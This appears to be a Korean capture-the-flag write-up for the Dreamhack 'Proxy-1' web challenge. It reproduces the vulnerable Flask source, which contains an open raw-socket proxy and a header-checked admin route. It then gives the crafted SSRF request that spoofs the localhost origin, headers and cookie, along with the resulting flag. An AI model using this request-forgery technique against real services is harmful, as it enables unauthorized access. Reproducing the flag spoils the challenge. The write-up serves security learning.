https://honey-push-30b.notion.site/Proxy-1-40db37abd8a7417297bd05e21792c40b
# 문제파일 다운로드

![proxy-1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/273e18bd-253e-441c-b410-b9f557c47d03/proxy-1.png)

Proxy-1 문제의 접속 정보와 문제파일을 다운로드 받을 수 있다. 다운로드 받으면 [app.py](http://app.py) 파일을 받을 수 있는데 이 파일의 코드는 아래와 같다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for
import socket

app = Flask(__name__)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/socket', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('socket.html')
    elif request.method == 'POST':
        host = request.form.get('host')
        port = request.form.get('port', type=int)
        data = request.form.get('data')

        retData = ""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((host, port))
                s.sendall(data.encode())
                while True:
                    tmpData = s.recv(1024)
                    retData += tmpData.decode()
                    if not tmpData: break
            
        except Exception as e:
            return render_template('socket_result.html', data=e)
        
        return render_template('socket_result.html', data=retData)

@app.route('/admin', methods=['POST'])
def admin():
    if request.remote_addr != '127.0.0.1':
        return 'Only localhost'

    if request.headers.get('User-Agent') != 'Admin Browser':
        return 'Only Admin Browser'

    if request.headers.get('DreamhackUser') != 'admin':	
        return 'Only Admin'

    if request.cookies.get('admin') != 'true':
        return 'Admin Cookie'

    if request.form.get('userid') != 'admin':
        return 'Admin id'

    return FLAG

app.run(host='0.0.0.0', port=8000)
```

## Index

![첫페이지.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4da950c3-2f37-4b10-b6d3-7ac713f5f062/%EC%B2%AB%ED%8E%98%EC%9D%B4%EC%A7%80.png)

Index페이지는 특별하게 고려할 사항은 없고 raw socket sender를 클릭하면 login페이지로 이동한다

## login 페이지

![raw socket sender.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa693768-0e10-4531-9e64-16a1ac284012/raw_socket_sender.png)

```python
@app.route('/socket', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('socket.html')
    elif request.method == 'POST':
        host = request.form.get('host')
        port = request.form.get('port', type=int)
        data = request.form.get('data')

        retData = ""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((host, port))
                s.sendall(data.encode())
                while True:
                    tmpData = s.recv(1024)
                    retData += tmpData.decode()
                    if not tmpData: break
            
        except Exception as e:
            return render_template('socket_result.html', data=e)
        
        return render_template('socket_result.html', data=retData)
```

Get으로 페이지를 불러오면(클릭해서 접속하면) 위와같은 페이지가 나타난다. 

POST의 경우 사용자가 입력한 host,port로 사용자가 입력한 data를 전송한 뒤 그 응답값을 받아온다.

## admin 함수

```python
@app.route('/admin', methods=['POST'])
def admin():
    if request.remote_addr != '127.0.0.1':
        return 'Only localhost'

    if request.headers.get('User-Agent') != 'Admin Browser':
        return 'Only Admin Browser'

    if request.headers.get('DreamhackUser') != 'admin':	
        return 'Only Admin'

    if request.cookies.get('admin') != 'true':
        return 'Admin Cookie'

    if request.form.get('userid') != 'admin':
        return 'Admin id'

    return FLAG
```

Admin페이지는 post로만 접근할 수 있다. 근데 이때 

1. 접근한 주소가 127.0.0.1(본인)이어야하고
2. User-Agent 헤더가 Admin Browser여야하며
3. DreamhackUser 헤더 또한 admin이어야하며
4. 쿠키 admin의 값이 true여야하고
5. 데이터의 userid값이 admin이어야 flag값을 리턴해준다.

# 문제 해결

socket으로 data form에 입력된 값들을 전부 보내고 그 응답값을 받아오므로 socket을 통해 request 요청을 한다. 그러면 서버에서 본인의 admin페이지로 요청하기 때문에 주소가 127.0.0.1이어서 첫번째 조건은 통과한다. 

```python
app.run(host='0.0.0.0', port=8000)
```

그리고 포트번호는 8000포트로 실행되는 것을 알기 때문에 8000으로 정해준다.

그 외의 요청은 dreamhack의 Introduction of webhacking([https://learn.dreamhack.io/6#13](https://learn.dreamhack.io/6#13)) 강좌의 500 Internal Server Error 의 Request를 참고하였다.

![예시.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/88653985-b670-4276-858b-d6094fa913eb/%EC%98%88%EC%8B%9C.png)

초록색부분은 메소드 

파란색은 상세페이지 

빨간색은 그대로쓰고

갈색으로 된부분은 헤더 

보라색은 data부분이므로 이를 위 조건에 맞춰서 띄어쓰기와 줄바꿈에 유의하여 작성하면 아래코드가 된다. 참고로 이때 보라색 부분의 길이에 맞춰서 헤더에 content length와 content type도 작성해야한다.

```html
POST /admin HTTP/1.1
Host: http://host3.dreamhack.games:13390/
Connection: keep-alive
User-Agent: Admin Browser
DreamhackUser: admin
Cookie: admin=true;
Content-Length: 12
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

userid=admin
```

![답.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a6944b90-21de-4b7a-8ee0-b6266cbaff05/%EB%8B%B5.png)

작성한 requests를 담아서 전송하면 아래와 같이 플래그 값이 나오는것을 확인할 수 있다.

![결과.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9e0f93d4-c82d-4ef2-8df9-37e7512fcc9c/%EA%B2%B0%EA%B3%BC.png)

```html
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 36
Server: Werkzeug/1.0.1 Python/3.8.2
Date: Thu, 11 Aug 2022 18:17:25 GMT

DH{9bb7177b6267ff7288e24e06d8dd6df5}
```

DH{9bb7177b6267ff7288e24e06d8dd6df5} 플래그를 획득했다
